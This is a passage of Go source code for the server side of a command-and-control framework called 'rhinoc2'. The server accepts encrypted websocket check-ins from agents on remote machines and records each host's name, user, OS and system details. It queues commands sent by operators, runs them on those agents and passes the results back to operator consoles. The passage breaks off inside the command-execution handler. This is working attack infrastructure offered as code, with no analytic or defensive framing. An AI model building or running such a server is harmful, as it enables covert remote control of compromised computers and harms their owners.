package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"rhinoc2/pkg/crypto"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

type Agent struct {
	ID          string
	Hostname    string
	Username    string
	OS          string
	Arch        string
	IP          string
	LastSeen    time.Time
	FirstSeen   time.Time
	Conn        *websocket.Conn
	TaskQueue   []Task
	TaskHistory []Task
	mu          sync.Mutex
	SysInfo     map[string]string
}

type Task struct {
	ID        string
	Command   string
	Args      string
	Status    string
	Result    string
	Timestamp time.Time
	Completed time.Time
}

type Message struct {
	Type    string      `json:"type"`
	AgentID string      `json:"agent_id,omitempty"`
	Data    interface{} `json:"data"`
}

type Server struct {
	agents    map[string]*Agent
	mu        sync.RWMutex
	upgrader  websocket.Upgrader
	crypto    *crypto.CryptoHandler
	operators map[*websocket.Conn]bool
	opMu      sync.RWMutex
	taskLog   []Task
	logMu     sync.RWMutex
}

func NewServer(key string) *Server {
	return &Server{
		agents: make(map[string]*Agent),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
		crypto:    crypto.NewCryptoHandler(key),
		operators: make(map[*websocket.Conn]bool),
		taskLog:   make([]Task, 0),
	}
}

func (s *Server) handleAgent(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("agent upgrade failed: %v", err)
		return
	}

	var agent *Agent
	defer func() {
		conn.Close()
		if agent != nil {
			s.mu.Lock()
			delete(s.agents, agent.ID)
			s.mu.Unlock()
			s.broadcastToOperators(Message{
				Type:    "agent_disconnected",
				AgentID: agent.ID,
			})
			log.Printf("agent disconnected: %s", agent.ID)
		}
	}()

	_, msg, err := conn.ReadMessage()
	if err != nil {
		log.Printf("read initial msg failed: %v", err)
		return
	}

	decrypted, err := s.crypto.Decrypt(string(msg))
	if err != nil {
		log.Printf("decrypt failed: %v", err)
		return
	}

	var checkin map[string]interface{}
	if err := json.Unmarshal(decrypted, &checkin); err != nil {
		log.Printf("unmarshal failed: %v", err)
		return
	}

	agent = &Agent{
		ID:        checkin["id"].(string),
		Hostname:  checkin["hostname"].(string),
		Username:  checkin["username"].(string),
		OS:        checkin["os"].(string),
		IP:        r.RemoteAddr,
		LastSeen:  time.Now(),
		FirstSeen: time.Now(),
		Conn:      conn,
	}

	if arch, ok := checkin["arch"].(string); ok {
		agent.Arch = arch
	}

	if sysinfo, ok := checkin["sysinfo"].(map[string]interface{}); ok {
		agent.SysInfo = make(map[string]string)
		for k, v := range sysinfo {
			if str, ok := v.(string); ok {
				agent.SysInfo[k] = str
			}
		}
	}

	s.mu.Lock()
	s.agents[agent.ID] = agent
	s.mu.Unlock()

	log.Printf("agent connected: %s (%s@%s) [%s/%s]",
		agent.ID[:16], agent.Username, agent.Hostname, agent.OS, agent.Arch)

	s.broadcastToOperators(Message{
		Type:    "agent_connected",
		AgentID: agent.ID,
		Data:    agent.info(),
	})

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}

		decrypted, err := s.crypto.Decrypt(string(msg))
		if err != nil {
			continue
		}

		var response map[string]interface{}
		if err := json.Unmarshal(decrypted, &response); err != nil {
			continue
		}

		agent.mu.Lock()
		agent.LastSeen = time.Now()

		if taskID, ok := response["task_id"].(string); ok {
			for i, task := range agent.TaskQueue {
				if task.ID == taskID {
					agent.TaskQueue[i].Status = "completed"
					agent.TaskQueue[i].Completed = time.Now()
					if result, ok := response["result"].(string); ok {
						agent.TaskQueue[i].Result = result
					}

					agent.TaskHistory = append(agent.TaskHistory, agent.TaskQueue[i])

					s.logMu.Lock()
					s.taskLog = append(s.taskLog, agent.TaskQueue[i])
					s.logMu.Unlock()

					s.broadcastToOperators(Message{
						Type:    "task_result",
						AgentID: agent.ID,
						Data:    agent.TaskQueue[i],
					})
					break
				}
			}
		}

		if len(agent.TaskQueue) > 0 {
			for i, task := range agent.TaskQueue {
				if task.Status == "pending" {
					taskData, _ := json.Marshal(task)
					encrypted, _ := s.crypto.Encrypt(taskData)
					conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
					agent.TaskQueue[i].Status = "sent"
					break
				}
			}
		}
		agent.mu.Unlock()
	}
}

func (s *Server) handleOperator(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("operator upgrade failed: %v", err)
		return
	}

	s.opMu.Lock()
	s.operators[conn] = true
	s.opMu.Unlock()

	defer func() {
		s.opMu.Lock()
		delete(s.operators, conn)
		s.opMu.Unlock()
		conn.Close()
	}()

	s.sendAgentList(conn)

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var cmd Message
		if err := json.Unmarshal(msg, &cmd); err != nil {
			continue
		}

		switch cmd.Type {
		case "list_agents":
			s.sendAgentList(conn)

		case "execute":
			if data, ok := cmd.Data.(map[string]interface{}); ok {
				agentID := data["agent_id"].(string)
				command := data["command"].(string)
				args := ""
				if a, ok := data["args"].(string); ok {
					args = a
				}
